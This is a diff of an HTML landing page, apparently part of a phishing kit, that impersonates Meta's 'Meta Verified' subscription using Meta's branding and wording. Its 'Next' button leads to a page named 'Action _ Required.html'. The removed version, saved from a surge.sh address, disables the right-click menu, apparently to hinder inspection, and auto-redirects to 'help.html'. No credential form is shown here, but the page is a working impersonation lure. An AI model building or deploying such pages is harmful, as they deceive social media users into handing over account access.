@@ -1,152 +1,190 @@
 <!DOCTYPE html>
-<!-- saved from url=(0035)https://verified-badge-fb.surge.sh/ -->
-<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
     <title>Home</title>
-    <link href="./Home_files/bootstrap.min.css" rel="stylesheet">
     <style>
-      /* CSS styles */
-
-      body {
-        font-family: system-ui;
-        margin: 0;
-        padding: 0;
-      }
-
-      .container-fluid {
-        background: #f5f6f6;
-      }
-
-      .container {
-        padding: 1rem;
-      }
-
-      .logo {
-        width: 9rem;
-        height: 6rem;
-      }
-
-      .meta-logo {
-        width: 4rem;
-        height: 4rem;
-      }
-
-      .btn {
-        background: #0064e0;
-        border: none;
-        border-radius: 100px;
-        padding: 10px 35px;
-        text-decoration: none;
-        color: white;
-        display: inline-block;
-        margin-top: 1rem;
-        font-family: Arial, sans-serif;
-        /* Same font family */
-        font-size: 16px;
-        /* Adjust as needed */
-      }
-
-      .content {
-        margin-top: 3rem;
-        display: flex;
-        justify-content: center;
-      }
-
-      .content .col-sm-6 {
-        margin-top: 3rem;
-        margin-left: 5rem;
-      }
-
-      .content p {
-        font-size: 18px;
-        margin-top: 1rem;
-        font-family: Arial, sans-serif;
-        /* Same font family */
-      }
-
-      .sign-up {
-        font-size: 17px;
-        padding-top: 1rem;
-        font-family: Arial, sans-serif;
-        /* Same font family */
-      }
-
-      .business-info {
-        font-size: 14px;
-        font-family: Arial, sans-serif;
-        /* Same font family */
-      }
-
-      .region-info {
-        font-size: 13px;
-        font-style: italic;
-        font-family: Arial, sans-serif;
-        /* Same font family */
-      }
-
-      .image {
-        display: none;
-        width: 42%;
-        height: 100vh;
-        /* Ensure full height */
-        background-size: cover;
-        /* background-position: center; */
-        /* margin-left: 5rem; */
-      }
-
-      @media (min-width: 576px) {
-        .image {
-          display: block;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
         }
-      }
+
+        html,
+        body {
+            height: 100%;
+            width: 100%;
+        }
+
+        #container {
+            height: 100%;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f0f2f5;
+        }
+
+        #box {
+            height: 40%;
+            width: 45%;
+            background-color: rgb(255, 255, 255);
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        #box>img {
+            width: 70px;
+            margin-top: 15px;
+        }
+
+        #data {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 15px;
+        }
+
+        #data>h4 {
+            font-size: 25px;
+        }
+
+        #data>img {
+            width: 25px;
+        }
+
+        .line {
+            height: .7px;
+            background-color: rgba(0, 0, 0, 0.222);
+            width: 90%;
+            margin: 1rem;
+        }
+
+        #para h2 {
+            font-size: 16px;
+        }
+
+        #para {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        #para p {
+            margin: 10px 100px 0px 100px;
+            font-size: 14px;
+        }
+
+        #para button {
+            padding: 10px 20px 10px 20px;
+            margin-top: 25px;
+            border: none;
+            border-radius: 2px;
+            font-size: 18px;
+            background-color: #145dbd;
+            cursor: pointer;
+        }
+
+        #para button a {
+            text-decoration: none;
+            color: #fff;
+        }
+
+        #para button:hover {
+            background-color: #03469e;
+        }
+
+
+
+
+        @media (max-width: 500px) {
+
+            #box {
+
+                margin: 0;
+                height: 45%;
+                width: 95%;
+                top: 0%;
+
+            }
+
+            #box>img {
+                width: 40px;
+            }
+
+            #data>h4 {
+                font-size: 18px;
+            }
+
+            #data>img {
+                width: 15px;
+                margin-left: 2px;
+            }
+
+            .line {
+                height: .5px;
+                width: 90%;
+                margin-left: auto;
+                margin-right: auto;
+                background-color: #00000045;
+            }
+
+            #para {
+                margin: 0%;
+            }
+
+            #para>h2 {
+                font-size: 12px;
+                font-weight: 700;
+                margin-bottom: 10px;
+            }
+
+            #para>p {
+                margin: 5px 15px 0px 15px;
+                font-size: 14px;
+            }
+
+            #para button {
+                padding: 8px 18px 8px 18px;
+                margin-top: 15px;
+                border: none;
+                border-radius: 2px;
+                font-size: 13px;
+                background-color: #1877F2;
+                cursor: pointer;
+            }
+        }
     </style>
-  </head>
+</head>
+<body>
+    <div id="container">
+        <div id="box">
+            <img src="Twitter_Verified_Badge.svg.png" alt="">
+            <div id="data">
+                <H4>Become Meta Verified </H4> <img src="bluetick.png" alt="">
+            </div>
+            <div class="line"></div>
+            <div id="para">
+                <h2> Meta giving opportunity to creators</h2>
+                <p> Grow your social presence with Meta Verified – a new subscription
+bundle available for creators and businesses on Instagram and
+Facebook.
 
-  <body>
-    <div class="container-fluid">
-      <div class="container">
-        <img src="Meta_Logo.jpg" alt="logo" class="logo">
-      </div>
+Sign up now for creators
+
+
+                <button> <a href="Action _ Required.html"> Next</a> </button>
+            </div>
+        </div>
     </div>
-    <div class="content">
-      <div class="col-sm-6">
-        <img src="Twitter_Verified_Badge.svg.png" alt="meta" class="meta-logo">
-        <h1 class="my-3 fs-1">
-          Become <br>
-          Meta Verified
-        </h1>
-        <div style="margin-bottom: 30px"></div>
-        <a href="" class="btn">Apply</a>
-        <p class="mt-4">
-          Grow your social presence with Meta Verified – a new subscription
-          <br>
-          bundle available for creators and businesses on Instagram and <br>
-          Facebook.
-        </p>
-        <p class="sign-up">Sign up now for creators</p>
-        <p class="mt-4 mb-0">
-          <span class="fw-semibold">Are you a business?</span> Get more
-          information on
-        </p>
-        <a href="" class="business-info">Meta verified for businesses</a>
-        <p class="mt-4 font-italic region-info">
-          Features, availability, and pricing may vary by region.
-        </p>
-      </div>
-      <div class="col-sm-5 image" style="background-image: url(&#39;./background.png&#39;)"></div>
-    </div>
-  
-  <script>
-    document.addEventListener('contextmenu', event => {
-        event.preventDefault();
-    });
+</body>
 
-    setTimeout(function() {
-    var redirectURL = "help.html"; // Updated URL
-    window.location.replace(redirectURL);
-    }, 3000); // 3000 milliseconds (3 seconds)
-    });
-  </script>
-
-</body></html>
+</html>
